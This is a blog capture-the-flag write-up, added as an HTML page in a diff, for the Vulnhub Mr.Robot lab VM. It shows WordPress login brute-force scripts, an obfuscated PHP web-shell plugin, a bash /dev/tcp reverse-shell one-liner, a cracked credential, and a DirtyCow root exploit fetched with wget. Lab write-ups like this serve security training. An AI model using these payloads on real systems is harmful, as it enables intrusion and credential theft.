@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+  <head>
+  <meta charset="utf-8" />
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <title>Vulnhub - Mr.Robot Writeup &middot; Pat~ Pat~ Meow~</title>
+  <meta name="description" content="" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" />
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://www.kmahyyg.xyz/css/main.min.css" />
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-123948588-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+  <style>
+    body {
+      background: #ecedef url("https://alicdn.kmahyyg.xyz/asset_files/aether/bgimg.webp") repeat;
+    }
+  </style>
+</head>
+  <body class="single-body">
+    <nav class="nav-bar side-padding">
+  <h1 class="nav-header"><a href="https://www.kmahyyg.xyz/" class="nav-text">Patrick Young</a></h1>
+  <div class="hamburger-menu">
+    <button onclick="hamburgerMenuPressed.call(this)" aria-haspopup="true" aria-expanded="false" aria-controls="menu" aria-label="Menu">
+      <span></span>
+      <span></span>
+    </button>
+    <ul id="menu" class="hamburger-menu-overlay">
+      <li><a href="https://www.kmahyyg.xyz/" class="hamburger-menu-overlay-link">Home</a></li>
+      <li><a href="https://www.kmahyyg.xyz/express-page/" class="hamburger-menu-overlay-link">Express Inc</a></li>
+      <li><a href="https://www.kmahyyg.xyz/about-me-page/" class="hamburger-menu-overlay-link">About</a></li>
+      <li><a href="https://www.kmahyyg.xyz/archlinux-bug-page/" class="hamburger-menu-overlay-link">Arch Linux</a></li>
+      <li><a href="https://www.kmahyyg.xyz/donate-page/" class="hamburger-menu-overlay-link">Donate</a></li>
+      <li><a href="https://www.kmahyyg.xyz/categories/code" class="hamburger-menu-overlay-link">Code</a></li><li><a href="https://www.kmahyyg.xyz/categories/life" class="hamburger-menu-overlay-link">Life</a></li><li><a href="https://www.kmahyyg.xyz/categories/network" class="hamburger-menu-overlay-link">Network</a></li><li><a href="https://www.kmahyyg.xyz/categories/school" class="hamburger-menu-overlay-link">School</a></li><li><a href="https://www.kmahyyg.xyz/categories/tech" class="hamburger-menu-overlay-link">Tech</a></li>
+    </ul>
+  </div>
+</nav>
+    <main class="content side-text-padding">
+      <article class="post ">
+        <header class="post-header">
+        	<h1 class="post-title">Vulnhub - Mr.Robot Writeup</h1>
+          <p class="post-date">Posted <time datetime="2019-06-05">Jun 5, 2019</time></p>
+        </header>
+        
+        <picture class="post-figure">
+            
+            <source srcset="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp">
+          <img src="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp" >
+        </picture>
+        
+        
+
+<h1 id="download-here">Download here</h1>
+
+<p>Target VM: <a href="https://download.vulnhub.com/mrrobot/mrRobot.ova">https://download.vulnhub.com/mrrobot/mrRobot.ova</a></p>
+
+<p>Difficulty: Beginner-Intermediate</p>
+
+<p>After you download it, just import to your VMWare workstation and change the network interface type as you pleased. Network is configured via DHCP.</p>
+
+<h1 id="before-start">Before Start</h1>
+
+<p>Prepare your Kali and ensure they are in the same subnet.</p>
+
+<p>Open VMware workstation - Edit - Virtual network editor to get the ip range.</p>
+
+<h2 id="check-vm-ip">Check VM IP</h2>
+
+<p><code>nmap -sn -n 172.16.51.0/24</code>, found: 172.16.51.132</p>
+
+<h1 id="gogogo">GOGOGO</h1>
+
+<h2 id="check-footprint">Check footprint</h2>
+
+<blockquote>
+<p>sudo nmap -sC -sC -oN mrbot -p1-65535 -O 172.16.51.132</p>
+</blockquote>
+
+<p>Found 80,443. Nothing useful.</p>
+
+<blockquote>
+<p>sudo nikto -o ./mrrbt.txt -h 172.16.51.132 -p 80</p>
+</blockquote>
+
+<p>Found wordpress.</p>
+
+<blockquote>
+<p>gobuster -u <a href="http://172.16.51.132">http://172.16.51.132</a> -w /media/kmahyyg/linuxdata/WorkData/HostedOnGithub/hackbox_tools/utils/outsidetools/dictionaries/DirBuster-Lists/directory-list-2.3-medium.txt -x php,html,txt,html -o mrrbot.txt</p>
+</blockquote>
+
+<p>Well, there&rsquo;s a lot of rabbit holes. But just check StatusCode == 200</p>
+
+<blockquote>
+<p>wpscan &ndash;url <a href="http://172.16.51.132">http://172.16.51.132</a> -o ./mrbot-wpscan.txt</p>
+</blockquote>
+
+<p>Wordpress scanned.</p>
+
+<h2 id="flag-1-robots-txt">Flag 1: robots.txt</h2>
+
+<p>A key file is listed and a dictionary is offered. Download them all, you get the first key.</p>
+
+<h2 id="flag-2">Flag 2</h2>
+
+<h3 id="wordpress-bruteforce">Wordpress bruteforce</h3>
+
+<p>You got a dictionary. Then next? Yes, try to bruteforce.</p>
+
+<p>First, try <code>hydra</code>, however, it&rsquo;s really slow here.</p>
+
+<p>I just write a simple Python3 script to make it much more faster.</p>
+
+<pre><code class="language-python3">#!/usr/bin/env python3
+import requests
+wordlist = open(&quot;fsocity.dic&quot;).readlines()
+set = set(wordlist) # REMOVE DUPLICATES
+tot = len(set)
+i = 0
+for w in set:
+    print(&quot;{current}/{total}&quot;.format(i, tot))
+    r = requests.post(&quot;http://172.16.51.132/wp-login.php&quot;, data={'log': w, 'pwd': “dummy”})
+    if &quot;Invalid username&quot; not in r.text:
+        print(&quot;USERNAME:&quot;)
+        print(w)
+        exit(0)
+    i += 1
+</code></pre>
+
+<p>Found username: elliot</p>
+
+<p>Then, Let&rsquo;s bruteforce the password.</p>
+
+<pre><code class="language-python3">#!/usr/bin/env python3
+import requests
+wordlist = open(&quot;fsocity.dic&quot;).readlines()
+set = set(wordlist) # REMOVE DUPLICATES
+tot = len(set)
+i = 0
+for w in set:
+    print(&quot;{current_time}/{total}&quot;.format(current_time=i, total=tot))
+    r = requests.post(&quot;http://172.16.51.132/wp-login.php&quot;, data={&quot;log&quot;: &quot;elliot&quot;, &quot;pwd&quot;: w})
+    if &quot;is incorrect&quot; not in r.text:
+        print(&quot;password:&quot;)
+        print(w)
+        exit(0)
+    i += 1
+</code></pre>
+
+<p>Found password: ER28-0652</p>
+
+<p>After you login, check all the place you can access.</p>
+
+<p>Then, You found nothing. But you can upload one plugin you love.</p>
+
+<h3 id="get-rce">Get RCE</h3>
+
+<p>You just use AntSword to add this shell and run it.</p>
+
+<p>Example: I saved the shell code into <code>neshell.php</code> and then pack it in zip file <code>shitwps.zip</code>, then upload but <strong>NOT ACTIVATE</strong> .</p>
+
+<p>URL: <a href="http://172.16.51.132/wp-content/plugins/shitwps/neshell.php">http://172.16.51.132/wp-content/plugins/shitwps/neshell.php</a></p>
+
+<pre><code>&lt;?php
+    /*
+    Plugin Name: AntSword Shell
+    Plugin URI: https://github.com/leonjza/wordpress-shell
+    Description: Inspired by leonjza, This shell plugin is generated by Antsword.
+    Author: Patrick Young
+    Version: 0.1
+    Author URI: https://www.kmahyyg.xyz
+    */?&gt;
+&lt;?php $JWgG=create_function(str_rot13('$').str_rot13('f').chr(01501-01322).str_rot13('z').base64_decode('ZQ=='),chr(0x13b3b/0x31f).base64_decode('dg==').chr(0610-0447).chr(56700/525).base64_decode('KA==').chr(01501-01435).chr(0x39d-0x32a).chr(68598/618).chr(0162070/01030).str_rot13('r').str_rot13(')').chr(0354-0261));$JWgG(base64_decode('NjMxN'.'Dc1O0'.'BldkF'.'sKCRf'.''.chr(0xcc88/0x268).base64_decode('RQ==').chr(14877/261).base64_decode('VA==').str_rot13('I').''.''.str_rot13('S').chr(603-487).base64_decode('bw==').chr(0152522/01173).chr(0x16f-0x102).''.'pxbGp'.'Jbl0p'.'OzE4O'.'TQ0Mj'.'U7'.''));?&gt;
+</code></pre>
+
+<p>Work as intended. After you get shell in User <code>daemon</code>.</p>
+
+<p>Get user by <code>cat /etc/passwd</code>, then you found a User <code>robot</code>, and try next to read home <code>/home/robot</code>, you will only find a password md5 and login via SSH to get the second flag.</p>
+
+<p>The credential is: <code>robot:c3fcd3d76192e4007dfb496cca67e13b</code></p>
+
+<p>It&rsquo;s a md5sum, just use <a href="https://hashkiller.co.uk/Cracker/MD5">Hashkiller</a> to crack, you find this <code>abcdefghijklmnopqrstuvwxyz</code>.</p>
+
+<p>However, you cannot login&hellip;&hellip;</p>
+
+<p>According to OSCP Rules, <code>metasploit</code> automated exploit is not allowed. So</p>
+
+<pre><code class="language-bash">$ bash -c 'bash -i &amp;&gt;/dev/tcp/192.168.1.69/4433 0&lt;&amp;1'
+</code></pre>
+
+<p>Reverse shell got with <code>nc -lvp 4433</code> before you issue the command above.</p>
+
+<p>Then use <code>whereis python3</code> to check if Python is working. Got <code>Python 3.4</code>.</p>
+
+<p>Next, Spawn a tty to login.</p>
+
+<pre><code>$ python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;);'
+</code></pre>
+
+<p>After you get a tty, then <code>su robot</code> and login.</p>
+
+<p>Second flag get: <code>822c73956184f694993bede3eb39f959</code></p>
+
+<h2 id="flag-3">Flag 3</h2>
+
+<h3 id="privilege-escalation">Privilege Escalation</h3>
+
+<p>After LinEnum, found nothing but kernel version is 3.13.0-55 with Ubuntu 14.04-LTS and you have <code>gcc-4.8</code>.</p>
+
+<p>Well, so if you got <code>gcc</code> with such an old kernel version, you will love DirtyCow.</p>
+
+<p>After some Google-fu,  Before <strong>3.13.0-100.147</strong> in Ubuntu 14.04 , all version are effected.</p>
+
+<p>So, directly DirtyCow. The most conveninent one is exploitdb-ID-40616, you should get this source code via searchsploit:</p>
+
+<pre><code class="language-bash">$ searchsploit -m 40616
+</code></pre>
+
+<p>Next, Open a http server in Python3 <code>python3 -m http.server 8080</code> and just wget it in victim <code>wget http://192.168.1.56/40616.c</code> to a writable folder <code>/tmp</code> , and then compile it via GCC <code>gcc cowroot.c -o cowroot -pthread</code> and then run it <code>./cowroot</code> to get root shell, after you get root, run <code>echo 0 &gt; /proc/sys/vm/dirty_writeback_centisecs</code> to make the shell more stable, then do anything you love, the third key is located at <code>/root/key-3-of-3.txt</code>.</p>
+
+<p>Third Key, get: <code>04787ddef27c3dee1ee161b21670b4e4</code>.</p>
+
+<h1 id="clean-up">Clean UP</h1>
+
+<p>DIRECTLY FORCE POWER OFF AFTER YOU FINISHED DIRTYCOW!</p>
+
+<p>(FINISHED)</p>
+
+      </article>
+      <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "kmahyyg" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+    </main>
+    <nav class="end-nav side-padding">
+      
+      <a ontouchstart="cardPressed.call(this)" ontouchend="cardReleased.call(this)" ontouchmove="cardReleased.call(this)" 
+  href="https://www.kmahyyg.xyz/welovecode/java-oop-inheritance-class/" class="card blog-card" rel="bookmark" >
+    
+    <div class="card-img-container">
+      <p class="card-img-overlay">Next Article</p>
+      <picture>
+        
+        <source srcset="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_code.webp">
+        <img src="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_code.webp" class="card-img" >
+      </picture>
+    </div>
+    
+  <article class="card-body">
+    <h2 class="card-title">Java 语言笔记 - 继承与类</h2>
+    <p class="card-text">Java 语言字符串处理和对终端 STDIN STDOUT 流的处理</p>
+    <div class="card-subtext muted-text">
+      <p>Posted <time datetime="2019-05-14 514:00">May 14, 2019</time></p>
+      <p>#school #code </p>
+    </div>
+  </article>
+</a>
+      
+      <a ontouchstart="cardPressed.call(this)" ontouchend="cardReleased.call(this)" ontouchmove="cardReleased.call(this)" 
+  href="https://www.kmahyyg.xyz/" class="card home-card" style="background-image: url( https://alicdn.kmahyyg.xyz/asset_files/aether/backtohome.webp )" rel="bookmark" >
+  Home
+</a>
+    </nav>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/highlight.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.js" integrity="sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/auto-render.min.js" integrity="sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe" crossorigin="anonymous"
+    onload="renderMathInElement(document.body);"></script>
+<script src="https://www.kmahyyg.xyz/js/core.js"></script>
+<script>
+  hljs.initHighlightingOnLoad();
+</script>
+  </body>
+</html>
